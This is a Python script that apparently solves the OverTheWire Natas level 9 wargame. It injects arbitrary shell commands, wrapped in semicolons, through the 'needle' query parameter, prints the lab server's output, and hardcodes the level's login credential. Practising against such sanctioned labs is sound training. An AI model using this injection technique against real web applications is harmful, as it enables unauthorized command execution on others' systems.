import sys
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas9', 'ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t') # Change the password if necessary
URL = "http://natas9.natas.labs.overthewire.org"

if __name__ == "__main__":
    n = len(sys.argv)
    if (n < 2):
        print("Too few arguments passed")
        print("Usage: python3 exploit.py <command>")
    else:
        command = ""
        for i in range(1, n):
            command += f" {sys.argv[i]}"
        command = command.strip()
        payload = f";{command};"
        query_params = {'needle' : payload}
        response = requests.get(URL, params=query_params, auth=auth)
        print(response.text)
